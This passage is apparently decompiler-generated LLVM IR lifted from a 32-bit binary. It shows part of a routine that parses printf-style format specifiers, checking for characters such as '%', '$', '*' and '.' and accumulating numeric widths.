  %v3_8052531126 = zext i8 %v2_8052531125 to i32
  %v5_8052531127 = and i32 %v4_8052531.pre, -256
  %v6_8052531128 = or i32 %v3_8052531126, %v5_8052531127
  store i32 %v6_8052531128, i32* %eax.global-to-local, align 4
  %v2_8052533129 = sext i8 %v2_8052531125 to i32
  store i32 %v2_8052533129, i32* @ecx, align 4
  %v2_8052536130 = mul nsw i32 %v2_8052533129, 2
  %v3_8052536131 = add i32 %v2_8052536130, %v0_8052519
  %v4_8052536132 = inttoptr i32 %v3_8052536131 to i8*
  %v5_8052536133 = load i8, i8* %v4_8052536132, align 1
  %v6_8052536134 = and i8 %v5_8052536133, 8
  %v7_8052536135 = icmp eq i8 %v6_8052536134, 0
  %v1_805253b136 = icmp eq i1 %v7_8052536135, false
  br i1 %v1_805253b136, label %dec_label_pc_8052521, label %dec_label_pc_805253d

dec_label_pc_8052521:                             ; preds = %dec_label_pc_8052517, %dec_label_pc_8052530
  %v2_8052533140 = phi i32 [ %v2_8052533, %dec_label_pc_8052530 ], [ %v2_8052533129, %dec_label_pc_8052517 ]
  %v6_8052531139 = phi i32 [ %v6_8052531, %dec_label_pc_8052530 ], [ %v6_8052531128, %dec_label_pc_8052517 ]
  %v0_8052530138 = phi i32 [ %v1_8052530, %dec_label_pc_8052530 ], [ %v0_8052531.pre, %dec_label_pc_8052517 ]
  %v1_8052529137 = phi i32 [ %v0_805254b32, %dec_label_pc_8052530 ], [ 0, %dec_label_pc_8052517 ]
  %v1_8052521 = add i32 %v1_8052529137, -4094
  %v6_8052521 = sub i32 4093, %v1_8052529137
  %v7_8052521 = and i32 %v6_8052521, %v1_8052529137
  %v8_8052521 = icmp slt i32 %v7_8052521, 0
  %v9_8052521 = icmp eq i32 %v1_8052521, 0
  %v10_8052521 = icmp slt i32 %v1_8052521, 0
  %v3_8052527 = icmp eq i1 %v10_8052521, %v8_8052521
  %v4_8052527 = icmp eq i1 %v9_8052521, false
  %v5_8052527 = and i1 %v4_8052527, %v3_8052527
  br i1 %v5_8052527, label %dec_label_pc_8052530, label %dec_label_pc_8052529

dec_label_pc_8052529:                             ; preds = %dec_label_pc_8052521
  %v3_8052529 = mul i32 %v1_8052529137, 10
  store i32 %v3_8052529, i32* %eax.global-to-local, align 4
  %v2_805252c = add i32 %v3_8052529, -48
  %v3_805252c = add i32 %v2_805252c, %v2_8052533140
  store i32 %v3_805252c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052530

dec_label_pc_8052530:                             ; preds = %dec_label_pc_8052521, %dec_label_pc_8052529
  %v0_805254b32 = phi i32 [ %v1_8052529137, %dec_label_pc_8052521 ], [ %v3_805252c, %dec_label_pc_8052529 ]
  %v4_805253128 = phi i32 [ %v6_8052531139, %dec_label_pc_8052521 ], [ %v3_8052529, %dec_label_pc_8052529 ]
  %v1_8052530 = add i32 %v0_8052530138, 1
  store i32 %v1_8052530, i32* @esi, align 4
  %v1_8052531 = inttoptr i32 %v1_8052530 to i8*
  %v2_8052531 = load i8, i8* %v1_8052531, align 1
  %v3_8052531 = zext i8 %v2_8052531 to i32
  %v5_8052531 = and i32 %v4_805253128, -256
  %v6_8052531 = or i32 %v3_8052531, %v5_8052531
  store i32 %v6_8052531, i32* %eax.global-to-local, align 4
  %v2_8052533 = sext i8 %v2_8052531 to i32
  store i32 %v2_8052533, i32* @ecx, align 4
  %v2_8052536 = mul nsw i32 %v2_8052533, 2
  %v3_8052536 = add i32 %v2_8052536, %v0_8052519
  %v4_8052536 = inttoptr i32 %v3_8052536 to i8*
  %v5_8052536 = load i8, i8* %v4_8052536, align 1
  %v6_8052536 = and i8 %v5_8052536, 8
  %v7_8052536 = icmp eq i8 %v6_8052536, 0
  %v1_805253b = icmp eq i1 %v7_8052536, false
  br i1 %v1_805253b, label %dec_label_pc_8052521, label %dec_label_pc_805253d

dec_label_pc_805253d:                             ; preds = %dec_label_pc_8052530, %dec_label_pc_8052517
  %v1_8052529.lcssa = phi i32 [ 0, %dec_label_pc_8052517 ], [ %v0_805254b32, %dec_label_pc_8052530 ]
  %v0_8052530.lcssa = phi i32 [ %v0_8052531.pre, %dec_label_pc_8052517 ], [ %v1_8052530, %dec_label_pc_8052530 ]
  %v2_8052531.lcssa = phi i8 [ %v2_8052531125, %dec_label_pc_8052517 ], [ %v2_8052531, %dec_label_pc_8052530 ]
  %v6_8052531.lcssa = phi i32 [ %v6_8052531128, %dec_label_pc_8052517 ], [ %v6_8052531, %dec_label_pc_8052530 ]
  %v0_805253d = load i32, i32* @edx, align 4
  %v1_805253d = add i32 %v0_805253d, -1
  %v2_805253d = inttoptr i32 %v1_805253d to i8*
  %v3_805253d = load i8, i8* %v2_805253d, align 1
  %v12_805253d = icmp eq i8 %v3_805253d, 37
  %v1_8052541 = icmp eq i1 %v12_805253d, false
  br i1 %v1_8052541, label %dec_label_pc_80525d4, label %dec_label_pc_8052547

dec_label_pc_8052547:                             ; preds = %dec_label_pc_805253d
  %v10_8052547 = icmp eq i8 %v2_8052531.lcssa, 36
  %v1_8052549 = icmp eq i1 %v10_8052547, false
  br i1 %v1_8052549, label %dec_label_pc_805257b, label %dec_label_pc_805254b

dec_label_pc_805254b:                             ; preds = %dec_label_pc_8052547
  %tmp89 = icmp slt i32 %v1_8052529.lcssa, 1
  br i1 %tmp89, label %dec_label_pc_805257b, label %dec_label_pc_805254f

dec_label_pc_805254f:                             ; preds = %dec_label_pc_805254b
  %v1_805254f = add i32 %v0_8052530.lcssa, 1
  store i32 %v1_805254f, i32* @edx, align 4
  %v4_8052552 = icmp eq i32 %stack_var_-88.1, 0
  br i1 %v4_8052552, label %dec_label_pc_805281c, label %dec_label_pc_805255d

dec_label_pc_805255d:                             ; preds = %dec_label_pc_805254f
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_8052565 = sub i32 %v1_8052529.lcssa, %stack_var_-88.1
  %v8_8052565 = xor i32 %v1_8052529.lcssa, %stack_var_-88.1
  %v9_8052565 = xor i32 %v2_8052565, %v1_8052529.lcssa
  %v10_8052565 = and i32 %v9_8052565, %v8_8052565
  %v11_8052565 = icmp slt i32 %v10_8052565, 0
  %v12_8052565 = icmp eq i32 %v2_8052565, 0
  %v13_8052565 = icmp slt i32 %v2_8052565, 0
  %v3_8052567 = icmp ne i1 %v13_8052565, %v11_8052565
  %v4_8052567 = or i1 %v12_8052565, %v3_8052567
  %stack_var_-88.1.v0_8052569 = select i1 %v4_8052567, i32 %stack_var_-88.1, i32 %v1_8052529.lcssa
  br label %dec_label_pc_8052577

dec_label_pc_8052577:                             ; preds = %dec_label_pc_805258b, %dec_label_pc_805255d, %dec_label_pc_805258f
  %v0_8052577 = phi i32 [ %v1_805254f, %dec_label_pc_805255d ], [ %v0_805253d, %dec_label_pc_805258f ], [ %v0_805253d, %dec_label_pc_805258b ]
  %stack_var_-32.2 = phi i32 [ %v1_8052529.lcssa, %dec_label_pc_805255d ], [ %stack_var_-32.1, %dec_label_pc_805258f ], [ %stack_var_-32.1, %dec_label_pc_805258b ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_8052569, %dec_label_pc_805255d ], [ 0, %dec_label_pc_805258f ], [ 0, %dec_label_pc_805258b ]
  store i32 %v0_8052577, i32* @esi, align 4
  br label %dec_label_pc_805259e

dec_label_pc_805257b:                             ; preds = %dec_label_pc_805254b, %dec_label_pc_8052547
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_805258b, label %dec_label_pc_8052582

dec_label_pc_8052582:                             ; preds = %dec_label_pc_805257b
  %v10_8052582 = icmp eq i8 %v2_8052531.lcssa, 109
  br i1 %v10_8052582, label %dec_label_pc_80525d4, label %dec_label_pc_805281c

dec_label_pc_805258b:                             ; preds = %dec_label_pc_805257b
  %tmp176 = icmp ugt i32 %v0_8052530.lcssa, %v0_805253d
  br i1 %tmp176, label %dec_label_pc_805258f, label %dec_label_pc_8052577

dec_label_pc_805258f:                             ; preds = %dec_label_pc_805258b
  %v1_805258f = inttoptr i32 %v0_805253d to i8*
  %v2_805258f = load i8, i8* %v1_805258f, align 1
  %v8_805258f = icmp eq i8 %v2_805258f, 48
  br i1 %v8_805258f, label %dec_label_pc_8052577, label %dec_label_pc_80525d4

dec_label_pc_805259e:                             ; preds = %dec_label_pc_80525af, %dec_label_pc_8052577
  %v0_80525ca = phi i32 [ %v1_80525af, %dec_label_pc_80525af ], [ %v0_8052577, %dec_label_pc_8052577 ]
  %v4_80525a835 = phi i32 [ %v6_80525a8, %dec_label_pc_80525af ], [ %v6_8052531.lcssa, %dec_label_pc_8052577 ]
  store i32 ptrtoint ([8 x i8]* @global_var_805b62a.495 to i32), i32* %edx.global-to-local, align 4
  %v1_80525ab = inttoptr i32 %v0_80525ca to i8*
  br label %dec_label_pc_80525a8

dec_label_pc_80525a8:                             ; preds = %dec_label_pc_80525b9, %dec_label_pc_805259e
  %v4_80525a8 = phi i32 [ %v4_80525a835, %dec_label_pc_805259e ], [ %v6_80525a8, %dec_label_pc_80525b9 ]
  %v0_80525aa = phi i32 [ ptrtoint ([8 x i8]* @global_var_805b62a.495 to i32), %dec_label_pc_805259e ], [ %v1_80525aa, %dec_label_pc_80525b9 ]
  %v0_80525b9 = phi i32 [ 1, %dec_label_pc_805259e ], [ %v2_80525b9, %dec_label_pc_80525b9 ]
  store i32 %v0_80525b9, i32* @ecx, align 4
  %v1_80525a8 = inttoptr i32 %v0_80525aa to i8*
  %v2_80525a8 = load i8, i8* %v1_80525a8, align 1
  %v3_80525a8 = zext i8 %v2_80525a8 to i32
  %v5_80525a8 = and i32 %v4_80525a8, -256
  %v6_80525a8 = or i32 %v3_80525a8, %v5_80525a8
  store i32 %v6_80525a8, i32* %eax.global-to-local, align 4
  %v1_80525aa = add i32 %v0_80525aa, 1
  store i32 %v1_80525aa, i32* @edx, align 4
  %v2_80525ab = load i8, i8* %v1_80525ab, align 1
  %v15_80525ab = icmp eq i8 %v2_80525ab, %v2_80525a8
  %v1_80525ad = icmp eq i1 %v15_80525ab, false
  br i1 %v1_80525ad, label %dec_label_pc_80525b4, label %dec_label_pc_80525af

dec_label_pc_80525af:                             ; preds = %dec_label_pc_80525a8
  %v1_80525af = add i32 %v0_80525ca, 1
  store i32 %v1_80525af, i32* @esi, align 4
  %v0_80525b0 = load i32, i32* %edi.global-to-local, align 4
  %v2_80525b0 = or i32 %v0_80525b0, %v0_80525b9
  store i32 %v2_80525b0, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805259e

dec_label_pc_80525b4:                             ; preds = %dec_label_pc_80525a8
  %v1_80525b4 = inttoptr i32 %v1_80525aa to i8*
  %v2_80525b4 = load i8, i8* %v1_80525b4, align 1
  %v3_80525b4 = icmp eq i8 %v2_80525b4, 0
  br i1 %v3_80525b4, label %dec_label_pc_80525bd, label %dec_label_pc_80525b9

dec_label_pc_80525b9:                             ; preds = %dec_label_pc_80525b4
  %v2_80525b9 = mul i32 %v0_80525b9, 2
  br label %dec_label_pc_80525a8

dec_label_pc_80525bd:                             ; preds = %dec_label_pc_80525b4
  %v0_80525bd = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80525c1 = udiv i32 %v0_80525bd, 2
  %v1_80525c1.not = or i32 %v1_80525c1, -6
  %v1_80525c6 = xor i32 %v1_80525c1.not, 5
  store i32 %v1_80525c6, i32* %eax.global-to-local, align 4
  %v2_80525c8 = and i32 %v1_80525c6, %v0_80525bd
  store i32 %v2_80525c8, i32* %edi.global-to-local, align 4
  %v1_80525ca = add i32 %v0_80525ca, -1
  %v2_80525ca = inttoptr i32 %v1_80525ca to i8*
  %v3_80525ca = load i8, i8* %v2_80525ca, align 1
  %v12_80525ca = icmp eq i8 %v3_80525ca, 37
  %v1_80525ce = icmp eq i1 %v12_80525ca, false
  br i1 %v1_80525ce, label %dec_label_pc_8052500, label %dec_label_pc_80525d4

dec_label_pc_80525d4:                             ; preds = %dec_label_pc_805258f, %dec_label_pc_80525bd, %dec_label_pc_805253d, %dec_label_pc_8052582
  %v0_80525f7 = phi i32 [ %v1_8052529.lcssa, %dec_label_pc_8052582 ], [ %v1_8052529.lcssa, %dec_label_pc_805258f ], [ 0, %dec_label_pc_80525bd ], [ %v1_8052529.lcssa, %dec_label_pc_805253d ]
  %v1_8052600 = phi i32 [ %v0_8052530.lcssa, %dec_label_pc_8052582 ], [ %v0_8052530.lcssa, %dec_label_pc_805258f ], [ %v0_80525ca, %dec_label_pc_80525bd ], [ %v0_8052530.lcssa, %dec_label_pc_805253d ]
  %v0_80525fd = phi i32 [ %v0_805253d, %dec_label_pc_8052582 ], [ %v0_805253d, %dec_label_pc_805258f ], [ %v1_80525aa, %dec_label_pc_80525bd ], [ %v0_805253d, %dec_label_pc_805253d ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_8052582 ], [ %stack_var_-32.1, %dec_label_pc_805258f ], [ %stack_var_-32.2, %dec_label_pc_80525bd ], [ %stack_var_-32.1, %dec_label_pc_805253d ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_8052582 ], [ 0, %dec_label_pc_805258f ], [ %stack_var_-88.2, %dec_label_pc_80525bd ], [ %stack_var_-88.1, %dec_label_pc_805253d ]
  %v1_80525d4 = inttoptr i32 %v0_80525fd to i8*
  %v2_80525d4 = load i8, i8* %v1_80525d4, align 1
  %v11_80525d4 = icmp eq i8 %v2_80525d4, 42
  %v1_80525d7 = icmp eq i1 %v11_80525d4, false
  br i1 %v1_80525d7, label %dec_label_pc_805260d, label %dec_label_pc_80525d9

dec_label_pc_80525d9:                             ; preds = %dec_label_pc_80525d4
  %v4_80525d9 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_80525d9, label %dec_label_pc_80525fd, label %dec_label_pc_80525e0

dec_label_pc_80525e0:                             ; preds = %dec_label_pc_80525d9
  %v1_80525e0 = inttoptr i32 %v1_8052600 to i8*
  %v2_80525e0 = load i8, i8* %v1_80525e0, align 1
  %v11_80525e0 = icmp eq i8 %v2_80525e0, 36
  %v1_80525e3 = icmp eq i1 %v11_80525e0, false
  br i1 %v1_80525e3, label %dec_label_pc_805281c, label %dec_label_pc_80525e9

dec_label_pc_80525e9:                             ; preds = %dec_label_pc_80525e0
  %tmp91 = icmp slt i32 %v0_80525f7, 1
  br i1 %tmp91, label %dec_label_pc_805281c, label %dec_label_pc_80525f1

dec_label_pc_80525f1:                             ; preds = %dec_label_pc_80525e9
  store i32 %v8_8052507, i32* %eax.global-to-local, align 4
  %v1_80525f6 = add i32 %v1_8052600, 1
  store i32 %v1_80525f6, i32* @esi, align 4
  %v1_80525f7 = load i32, i32* @esp, align 4
  %v3_80525f7 = add i32 %v8_8052507, 68
  %v4_80525f7 = add i32 %v3_80525f7, %v1_80525f7
  %v5_80525f7 = inttoptr i32 %v4_80525f7 to i32*
  store i32 %v0_80525f7, i32* %v5_80525f7, align 4
  %v0_805263b.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052608

dec_label_pc_80525fd:                             ; preds = %dec_label_pc_80525d9
  %v1_80525fd = add i32 %v0_80525fd, 1
  store i32 %v1_80525fd, i32* %eax.global-to-local, align 4
  %v12_8052600 = icmp eq i32 %v1_80525fd, %v1_8052600
  %v1_8052602 = icmp eq i1 %v12_8052600, false
  br i1 %v1_8052602, label %dec_label_pc_805281c, label %dec_label_pc_8052608

dec_label_pc_8052608:                             ; preds = %dec_label_pc_80525fd, %dec_label_pc_80525f1
  %v0_805263b.pre.pre.pre = phi i32 [ %v1_8052600, %dec_label_pc_80525fd ], [ %v0_805263b.pre.pre.pre.pre, %dec_label_pc_80525f1 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805260d

dec_label_pc_805260d:                             ; preds = %dec_label_pc_80525d4, %dec_label_pc_8052608
  %v0_805263b.pre.pre = phi i32 [ %v1_8052600, %dec_label_pc_80525d4 ], [ %v0_805263b.pre.pre.pre, %dec_label_pc_8052608 ]
  %v0_80524a6 = phi i32 [ %v0_80525f7, %dec_label_pc_80525d4 ], [ -2147483648, %dec_label_pc_8052608 ]
  %v4_805260d = trunc i64 %stack_var_-92.1.ph to i32
  %v5_805260d = icmp eq i32 %v4_805260d, 0
  %v1_8052612 = icmp eq i1 %v5_805260d, false
  %.pre = inttoptr i32 %v0_805263b.pre.pre to i8*
  br i1 %v1_8052612, label %dec_label_pc_8052636, label %dec_label_pc_8052618

dec_label_pc_8052618:                             ; preds = %dec_label_pc_805260d
  %v2_8052618 = load i8, i8* %.pre, align 1
  %v11_8052618 = icmp eq i8 %v2_8052618, 46
  %v1_805261b = icmp eq i1 %v11_8052618, false
  br i1 %v1_805261b, label %dec_label_pc_805262f, label %dec_label_pc_805261d

dec_label_pc_805261d:                             ; preds = %dec_label_pc_8052618
  %v1_805261d = add i32 %v0_805263b.pre.pre, 1
  store i32 %v1_805261d, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052500.outer

dec_label_pc_805262f:                             ; preds = %dec_label_pc_8052618
  br label %dec_label_pc_8052636

dec_label_pc_8052636:                             ; preds = %dec_label_pc_805260d, %dec_label_pc_805262f
  %stack_var_-96.2 = phi i32 [ %v0_80524a6, %dec_label_pc_805262f ], [ %stack_var_-96.1.ph, %dec_label_pc_805260d ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_805262f ], [ %v0_80524a6, %dec_label_pc_805260d ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_805b5d8.496 to i32), i32* @edx, align 4
  %v4_805263b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805263b

dec_label_pc_805263b:                             ; preds = %dec_label_pc_8052645, %dec_label_pc_8052636
  %v0_8052645 = phi i32 [ %v1_8052645, %dec_label_pc_8052645 ], [ ptrtoint ([9 x i8]* @global_var_805b5d8.496 to i32), %dec_label_pc_8052636 ]
  %v4_805263b = phi i32 [ %v6_805263b, %dec_label_pc_8052645 ], [ %v4_805263b.pre, %dec_label_pc_8052636 ]
  %v2_805263b = load i8, i8* %.pre, align 1
  %v3_805263b = zext i8 %v2_805263b to i32
  %v5_805263b = and i32 %v4_805263b, -256
  %v6_805263b = or i32 %v3_805263b, %v5_805263b
  store i32 %v6_805263b, i32* %eax.global-to-local, align 4
  %v3_805263d = inttoptr i32 %v0_8052645 to i8*
  %v4_805263d = load i8, i8* %v3_805263d, align 1
  %v15_805263d = icmp eq i8 %v2_805263b, %v4_805263d
  br i1 %v15_805263d, label %dec_label_pc_80524ad, label %dec_label_pc_8052645

dec_label_pc_8052645:                             ; preds = %dec_label_pc_805263b
  %v1_8052645 = add i32 %v0_8052645, 1
  store i32 %v1_8052645, i32* @edx, align 4
  %v1_8052646 = inttoptr i32 %v1_8052645 to i8*
  %v2_8052646 = load i8, i8* %v1_8052646, align 1
  %v3_8052646 = icmp eq i8 %v2_8052646, 0
  %v1_8052649 = icmp eq i1 %v3_8052646, false
  br i1 %v1_8052649, label %dec_label_pc_805263b, label %dec_label_pc_805264b

dec_label_pc_805264b:                             ; preds = %dec_label_pc_8052645, %dec_label_pc_80524ad
  %v0_805265e = phi i32 [ %v1_80524ad, %dec_label_pc_80524ad ], [ %v0_805263b.pre.pre, %dec_label_pc_8052645 ]
  %v0_805265b = phi i32 [ %v0_8052645, %dec_label_pc_80524ad ], [ %v1_8052645, %dec_label_pc_8052645 ]
  %v1_805264d = add i32 %v0_805265b, -134591960
  %v1_8052652 = add i32 %v0_805265b, -134591961
  %v5_8052652 = sub i32 134591960, %v0_805265b
  %v6_8052652 = and i32 %v1_805264d, %v5_8052652
  %v7_8052652 = icmp slt i32 %v6_8052652, 0
  %v8_8052652 = icmp eq i32 %v1_8052652, 0
  %v9_8052652 = icmp slt i32 %v1_8052652, 0
  store i32 %v1_8052652, i32* %eax.global-to-local, align 4
  %v3_8052653 = icmp eq i1 %v9_8052652, %v7_8052652
  %v4_8052653 = icmp eq i1 %v8_8052652, false
  %v5_8052653 = and i1 %v4_8052653, %v3_8052653
  br i1 %v5_8052653, label %dec_label_pc_805265f, label %dec_label_pc_8052655

dec_label_pc_8052655:                             ; preds = %dec_label_pc_805264b
  %v1_8052655 = inttoptr i32 %v0_805265e to i8*
  %v2_8052655 = load i8, i8* %v1_8052655, align 1
  %v3_8052655 = zext i8 %v2_8052655 to i32
  %v5_8052655 = and i32 %v1_8052652, -256
  %v6_8052655 = or i32 %v3_8052655, %v5_8052655
  store i32 %v6_8052655, i32* %eax.global-to-local, align 4
  %v3_8052657 = inttoptr i32 %v0_805265b to i8*
  %v4_8052657 = load i8, i8* %v3_8052657, align 1
  %v15_8052657 = icmp eq i8 %v2_8052655, %v4_8052657
  %v1_8052659 = icmp eq i1 %v15_8052657, false
  br i1 %v1_8052659, label %dec_label_pc_805265f, label %dec_label_pc_805265b

dec_label_pc_805265b:                             ; preds = %dec_label_pc_8052655
  %v1_805265b = add i32 %v0_805265b, 9
  store i32 %v1_805265b, i32* @edx, align 4
  %v1_805265e = add i32 %v0_805265e, 1
  store i32 %v1_805265e, i32* @esi, align 4
  br label %dec_label_pc_805265f

dec_label_pc_805265f:                             ; preds = %dec_label_pc_8052655, %dec_label_pc_805264b, %dec_label_pc_805265b
  %v4_8052666 = phi i32 [ %v6_8052655, %dec_label_pc_8052655 ], [ %v1_8052652, %dec_label_pc_805264b ], [ %v6_8052655, %dec_label_pc_805265b ]
  %v0_8052666 = phi i32 [ %v0_805265e, %dec_label_pc_8052655 ], [ %v0_805265e, %dec_label_pc_805264b ], [ %v1_805265e, %dec_label_pc_805265b ]
  %v0_805265f = phi i32 [ %v0_805265b, %dec_label_pc_8052655 ], [ %v0_805265b, %dec_label_pc_805264b ], [ %v1_805265b, %dec_label_pc_805265b ]
  %v1_805265f = add i32 %v0_805265f, 9
  %v2_805265f = inttoptr i32 %v1_805265f to i8*
  %v3_805265f = load i8, i8* %v2_805265f, align 1
  %v4_805265f = sext i8 %v3_805265f to i32
  %v2_8052663 = mul nsw i32 %v4_805265f, 256
  store i32 %v2_8052663, i32* %ebx.global-to-local, align 4
  %v1_8052666 = inttoptr i32 %v0_8052666 to i8*
  %v2_8052666 = load i8, i8* %v1_8052666, align 1
  %v3_8052666 = zext i8 %v2_8052666 to i32
  %v5_8052666 = and i32 %v4_8052666, -256
  %v6_8052666 = or i32 %v3_8052666, %v5_8052666
  store i32 %v6_8052666, i32* %eax.global-to-local, align 4
  %v4_8052668 = icmp eq i8 %v2_8052666, 0
  br i1 %v4_8052668, label %dec_label_pc_805281c, label %dec_label_pc_8052670

dec_label_pc_8052670:                             ; preds = %dec_label_pc_805265f
  store i32 ptrtoint ([21 x i8]* @global_var_805b615.497 to i32), i32* %ecx.global-to-local, align 4
  %v3_8052675 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052675, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052679

dec_label_pc_8052679:                             ; preds = %dec_label_pc_80526c8, %dec_label_pc_8052670
  %v0_80526c8 = phi i32 [ %v1_80526c8, %dec_label_pc_80526c8 ], [ ptrtoint ([21 x i8]* @global_var_805b615.497 to i32), %dec_label_pc_8052670 ]
  %v3_8052679 = inttoptr i32 %v0_80526c8 to i8*
  %v4_8052679 = load i8, i8* %v3_8052679, align 1
  %v15_8052679 = icmp eq i8 %v2_8052666, %v4_8052679
  %v1_805267b = icmp eq i1 %v15_8052679, false
  br i1 %v1_805267b, label %dec_label_pc_80526c8, label %dec_label_pc_805267d

dec_label_pc_805267d:                             ; preds = %dec_label_pc_8052679
  %v1_805267f = add i32 %v0_80526c8, -134592021
  store i32 %v1_805267f, i32* %edx.global-to-local, align 4
  %v7_8052688 = icmp sgt i32 %v1_805267f, 17
  br i1 %v7_8052688, label %dec_label_pc_805268a, label %dec_label_pc_8052692

dec_label_pc_805268a:                             ; preds = %dec_label_pc_805267d
  %v3_805268a = and i32 %v2_8052663, 1024
  %v4_805268a = icmp eq i32 %v3_805268a, 0
  br i1 %v4_805268a, label %dec_label_pc_8052692, label %dec_label_pc_805268f

dec_label_pc_805268f:                             ; preds = %dec_label_pc_805268a
  %v1_805268f = add i32 %v0_80526c8, -134592023
  store i32 %v1_805268f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052692

dec_label_pc_8052692:                             ; preds = %dec_label_pc_805267d, %dec_label_pc_805268a, %dec_label_pc_805268f
  %v0_805269b = phi i32 [ %v1_805267f, %dec_label_pc_805267d ], [ %v1_805267f, %dec_label_pc_805268a ], [ %v1_805268f, %dec_label_pc_805268f ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b60b.498 to i32), i32* %ecx.global-to-local, align 4
  %v2_805269b = add i32 %tmp76, 32
  %v3_805269b = inttoptr i32 %v2_805269b to i32*
  store i32 %v0_805269b, i32* %v3_805269b, align 4
  %v0_805269e.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_80526a2.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805269e

dec_label_pc_805269e:                             ; preds = %dec_label_pc_805269e, %dec_label_pc_8052692
  %v0_805269e = phi i32 [ %v1_805269e, %dec_label_pc_805269e ], [ %v0_805269e.pre, %dec_label_pc_8052692 ]
  %v1_805269e = add i32 %v0_805269e, 1
  store i32 %v1_805269e, i32* %ecx.global-to-local, align 4
  %v1_805269f = inttoptr i32 %v1_805269e to i8*
  %v2_805269f = load i8, i8* %v1_805269f, align 1
  %v3_805269f = sext i8 %v2_805269f to i32
  store i32 %v3_805269f, i32* %eax.global-to-local, align 4
  %v8_80526a4 = icmp sgt i32 %v0_80526a2.pre, %v3_805269f
  br i1 %v8_80526a4, label %dec_label_pc_805269e, label %dec_label_pc_80526a6

dec_label_pc_80526a6:                             ; preds = %dec_label_pc_805269e
  store i32 ptrtoint ([21 x i8]* @global_var_805b615.497 to i32), i32* @ecx, align 4
  %v1_80526ad = add i32 %v0_805269e, -134592011
  store i32 %v1_80526ad, i32* %eax.global-to-local, align 4
  %v2_80526b2 = add i32 %v0_805269e, add (i32 ptrtoint (i32* @global_var_805b5fc.499 to i32), i32 -134592011)
  %v3_80526b2 = add i32 %v2_80526b2, %v1_80526ad
  %v4_80526b2 = inttoptr i32 %v3_80526b2 to i16*
  %v5_80526b2 = load i16, i16* %v4_80526b2, align 2
  %v6_80526b2 = sext i16 %v5_80526b2 to i32
  store i32 %v6_80526b2, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_80526ad, 2
  %v3_80526ba = add i32 %factor, 134591980
  %v4_80526ba = inttoptr i32 %v3_80526ba to i16*
  %v5_80526ba = load i16, i16* %v4_80526ba, align 2
  %v6_80526ba = sext i16 %v5_80526ba to i32
  store i32 %v6_80526ba, i32* %eax.global-to-local, align 4
  %v1_80526c2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80526c2 = or i32 %v1_80526c2, %v6_80526b2
  %v2_80526c4 = and i32 %v2_80526c2, %v6_80526ba
  store i32 %v2_80526c4, i32* %edx.global-to-local, align 4
  %v0_80526d6.pre = load i32, i32* @esi, align 4
  %v0_80526d9.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80526ce

dec_label_pc_80526c8:                             ; preds = %dec_label_pc_8052679
  %v1_80526c8 = add i32 %v0_80526c8, 1
  store i32 %v1_80526c8, i32* @ecx, align 4
  %v1_80526c9 = inttoptr i32 %v1_80526c8 to i8*
  %v2_80526c9 = load i8, i8* %v1_80526c9, align 1
  %v3_80526c9 = icmp eq i8 %v2_80526c9, 0
  %v1_80526cc = icmp eq i1 %v3_80526c9, false
  br i1 %v1_80526cc, label %dec_label_pc_8052679, label %dec_label_pc_80526ce

dec_label_pc_80526ce:                             ; preds = %dec_label_pc_80526c8, %dec_label_pc_80526a6
  %v0_80526d9 = phi i32 [ %v0_80526d9.pre, %dec_label_pc_80526a6 ], [ %storemerge4, %dec_label_pc_80526c8 ]
  %v0_80526d6 = phi i32 [ %v0_80526d6.pre, %dec_label_pc_80526a6 ], [ %v0_8052666, %dec_label_pc_80526c8 ]
  %v0_80526ce = phi i32 [ %v2_80526c4, %dec_label_pc_80526a6 ], [ %v3_8052675, %dec_label_pc_80526c8 ]
  store i32 %v0_80526ce, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_80526d6 = inttoptr i32 %v0_80526d6 to i8*
  %v2_80526d6 = load i8, i8* %v1_80526d6, align 1
  %v3_80526d6 = sext i8 %v2_80526d6 to i32
  store i32 %v3_80526d6, i32* %eax.global-to-local, align 4
  %v2_80526d9 = add i32 %tmp76, 4
  %v3_80526d9 = inttoptr i32 %v2_80526d9 to i32*
  store i32 %v0_80526d9, i32* %v3_80526d9, align 4
  %v0_80526dc = load i32, i32* %eax.global-to-local, align 4
  %v1_80526dc = load i32, i32* @edx, align 4
  %v2_80526dc = add i32 %v1_80526dc, 12
  %v3_80526dc = inttoptr i32 %v2_80526dc to i32*
  store i32 %v0_80526dc, i32* %v3_80526dc, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_80526e3 = load i32, i32* @edx, align 4
  %v1_80526e3 = add i32 %v0_80526e3, 28
  %v2_80526e3 = inttoptr i32 %v1_80526e3 to i32*
  store i32 1, i32* %v2_80526e3, align 4
  %v0_80526ea = load i32, i32* %eax.global-to-local, align 4
  %v1_80526ea = load i32, i32* @edx, align 4
  %v2_80526ea = add i32 %v1_80526ea, 8
  %v3_80526ea = inttoptr i32 %v2_80526ea to i32*
  store i32 %v0_80526ea, i32* %v3_80526ea, align 4
